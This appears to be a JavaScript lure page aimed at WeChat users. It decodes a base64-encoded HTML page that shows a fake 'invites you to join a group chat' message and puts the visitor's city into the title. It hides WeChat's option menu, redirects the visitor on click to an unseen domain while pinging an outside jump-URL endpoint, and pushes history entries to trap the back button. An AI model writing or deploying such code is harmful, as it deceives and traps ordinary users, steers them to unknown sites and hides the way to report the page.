var doc = document.open('text/html', 'replace');
var dat = window.atob('PGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1UeXBlImNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+PHRpdGxlPjwvdGl0bGU+PHN0eWxlIHR5cGU9InRleHQvY3NzIj4uY29udGVudHtiYWNrZ3JvdW5kLWNvbG9yOiMwMDAwMDA7Y29sb3I6IzAwMDAwMH08L3N0eWxlPjwvaGVhZD48Ym9keT48bWV0YSBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsaW5pdGlhbC1zY2FsZT0xLjAsbWluaW11bS1zY2FsZT0xLjAsbWF4aW11bS1zY2FsZT0xLjAsdXNlci1zY2FsYWJsZT1ubyJuYW1lPSJ2aWV3cG9ydCI+PG1ldGEgY29udGVudD0ieWVzIm5hbWU9ImFwcGxlLW1vYmlsZS13ZWItYXBwLWNhcGFibGUiPjxtZXRhIGNvbnRlbnQ9ImJsYWNrIm5hbWU9ImFwcGxlLW1vYmlsZS13ZWItYXBwLXN0YXR1cy1iYXItc3R5bGUiPjxtZXRhIGNvbnRlbnQ9InRlbGVwaG9uZT1ubyJuYW1lPSJmb3JtYXQtZGV0ZWN0aW9uIj48bWV0YSBjb250ZW50PSJlbWFpbD1ubyJuYW1lPSJmb3JtYXQtZGV0ZWN0aW9uIj48bWV0YSBjb250ZW50PSIibmFtZT0icGd2Ij48c3R5bGU+aDEsaDIsZGl2LGJvZHksaW1nLGF7bWFyZ2luOjA7cGFkZGluZzowfWJvZHl7Zm9udC1zaXplOjE2cHg7bGluZS1oZWlnaHQ6MS41O2ZvbnQtZmFtaWx5OiLlvq7ova/pm4Xpu5EiLCJMdWNpZGEgR3JhbmRlIixTVEhlaXRpLFZlcmRhbmEsQXJpYWwsVGltZXMsc2VyaWY7YmFja2dyb3VuZDojZjBlZmY0fWltZ3tib3JkZXI6MCBub25lfWF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Zm9udC13ZWlnaHQ6bm9ybWFsO2NvbG9yOiMzMzMzMzN9dWx7bGlzdC1zdHlsZTp1bnNldDtsaXN0LXN0eWxlLXR5cGU6ZGVjaW1hbH0udG9we3dpZHRoOjEwMCU7YmFja2dyb3VuZDojZmZmZmZmO21hcmdpbjowIGF1dG87dGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzozMHB4IDAgMjRweH0udG9wIGltZ3t3aWR0aDo5MHB4O2JvcmRlci1yYWRpdXM6NXB4fS50b3AgaDJ7Zm9udC13ZWlnaHQ6bm9ybWFsO2ZvbnQtc2l6ZToxOHB4O21hcmdpbi10b3A6N3B4O2NvbG9yOiM0ZDRjNTF9LnRvcCBzcGFue2NvbG9yOiM4Nzg3ODd9LmJvdHt3aWR0aDoxMDAlO2JvcmRlci10b3A6MXB4IHNvbGlkI2JlYmViZX0uYm90IGgxe3dpZHRoOjEwMCU7dGV4dC1hbGlnbjpjZW50ZXI7ZGlzcGxheTppbmxpbmU7ZmxvYXQ6bGVmdDtmb250LXdlaWdodDpub3JtYWw7Y29sb3I6IzRkNGM1MTtmb250LXNpemU6MjBweDttYXJnaW46NDBweCAwIDEwcHh9LmJvdCBhe3dpZHRoOjU0JTtkaXNwbGF5OmlubGluZTtmbG9hdDpsZWZ0O21hcmdpbjoxNXB4IDIzJTI1cHg7YmFja2dyb3VuZDojMDRiZTAxO2NvbG9yOiNmZmZmZmY7dGV4dC1hbGlnbjpjZW50ZXI7cGFkZGluZzo4cHggMDtib3JkZXItcmFkaXVzOjVweDtmb250LXNpemU6MThweH0uYm90IHVse2NvbG9yOiNiNWI0Yjk7ZGlzcGxheTppbmxpbmU7ZmxvYXQ6bGVmdDttYXJnaW4tbGVmdDoxMHB4O21hcmdpbi1yaWdodDozMHB4fS5ib257d2lkdGg6NTQlO2Rpc3BsYXk6aW5saW5lO2Zsb2F0OmxlZnQ7bWFyZ2luOjE1cHggMjMlMjVweDtiYWNrZ3JvdW5kOiMwNGJlMDE7Y29sb3I6I2ZmZmZmZjt0ZXh0LWFsaWduOmNlbnRlcjtwYWRkaW5nOjhweCAwO2JvcmRlci1yYWRpdXM6NXB4O2ZvbnQtc2l6ZToxOHB4fTwvc3R5bGU+PGRpdiBjbGFzcz0idG9wIj48aW1nIGlkPSJpbWdzInNyYz0iImFsdD0iIj48aDIgaWQ9InFuYW1lIj48L2gyPjxzcGFuIGlkPSJwZW9wbGUiPjwvc3Bhbj48L2Rpdj48ZGl2IGNsYXNzPSJib3QiPjxoMSBpZD0ibmlzIj48c3BhbiBpZD0iZnJpZW5kIj48L3NwYW4+PC9oMT48ZGl2IGNsYXNzPSJib24iPjwvZGl2PjwvZGl2PjxkaXYgc3R5bGU9ImRpc3BsYXk6IG5vbmUiPjwvZGl2PjwvYm9keT48L2h0bWw+');
doc.write(dat);
doc.close();
$("#nis").html('\u9080\u8bf7\u4f60\u52a0\u5165\u7fa4\u804a');
$(".bon").html('\u52a0\u5165\u7fa4\u804a');
$(document).attr("title","\u9080\u4f60\u52a0\u5165\u7fa4\u804a");
//var obj = JSON.parse(window.atob(getJsParam('b.js', 'xs')));
var obj = JSON.parse(bbg);
var address = localAddress.city ? localAddress.city : (localAddress.province ? localAddress.province : '成都');
var city = address.replace(/(.*)市/, '$1');
city = city.replace(/(.*)省/, '$1');

if (typeof WeixinJSBridge == "undefined") {
    if (document.addEventListener) {
        document.addEventListener('WeixinJSBridgeReady', onBridgeReady, false);
    } else if (document.attachEvent) {
        document.attachEvent('WeixinJSBridgeReady', onBridgeReady);
        document.attachEvent('onWeixinJSBridgeReady', onBridgeReady);
    }
} else {
    onBridgeReady();
}
console.log('--------------------------logobj--------------------------');
console.log(obj);
console.log(obj.will[0]);
$("#imgs").attr('src',obj.img);
var res = obj.title.replace(/{city}/,city );
$("#qname").html(res);
$("#nis").prepend('"'+obj.will[0]+'"');
// $("#div1").prepend("Some prepended text.");
function onBridgeReady() {
    WeixinJSBridge.call('hideOptionMenu');
}
function getJsParam(jsName, paramName) {
    /*******************************************
     说明：获取js文件后的参数
     jsName：js文件名称
     paramName：要获取的参数名称（如果该参数没有传，则返回整个js参数的数组Json对象）
     ********************************************/
    var retJsonArr = [],
        retVal = '';
    var rName = new RegExp(jsName + "(\\?(.*))?$");
    var jss = document.getElementsByTagName('script');
    for (var i = 0; i < jss.length; i++) {
        var j = jss[i];
        if (j.src && j.src.match(rName)) {
            var oo = j.src.match(rName)[2];
            if (oo && (t = oo.match(/([^&=]+)=([^=&]+)/g))) {
                for (var l = 0; l < t.length; l++) {
                    r = t[l];
                    var tt = r.match(/([^&=]+)=([^=&]+)/);
                    if (tt) {
                        retJsonArr.push({
                            key: tt[1],
                            val: tt[2]
                        });

                        if (paramName != undefined && paramName.length > 0 && paramName == tt[1]) {
                            retVal = tt[2];
                        }
                    }
                }
            }
        }
    }
    return paramName != undefined && paramName.length > 0 ? retVal : retJsonArr;
}
function rt(n) {
    var i = new RegExp("(^|&)" + n + "=([^&]*)(&|$)"),
        t = window.location.search.substr(1).match(i);
    return t != null ? decodeURI(t[2]) : null
}

function toUnicodeFun(data) {
    var str = '';
    for (var i = 0; i < data.length; i++) {
        str += "\\u" + data.charCodeAt(i).toString(16);
    }
    return str;
}

function toChineseWords(data) {
    data = data.split("\\u");
    var str = '';
    for (var i = 0; i < data.length; i++) {
        str += String.fromCharCode(parseInt(data[i], 16).toString(10));
    }
    return str;
}
$(".bon").on('click', function  () {
	location.href =d3_domain;
    $.getJSON('http://www.dedaopaper.com/index.php/index/jumpurl/id/' + obj.id, function (t) {
        //location.href = t.val;    
    })
});
//http://www.yixitong777.com/adv/Ainterfaces/dir/1029/index/indefive
//http://zhuangyuanfujiuye.com/index.php/index/vasl/id/6
$.getJSON('../6.json', function (t) {
    setTimeout(function () {
        history.pushState(history.length + 1, "message", "#" + new Date().getTime());
    }, 200);
   // url = t.url;
  	url=t.v;
    window.onhashchange = function () {
        //location.href = url;      
    };
});
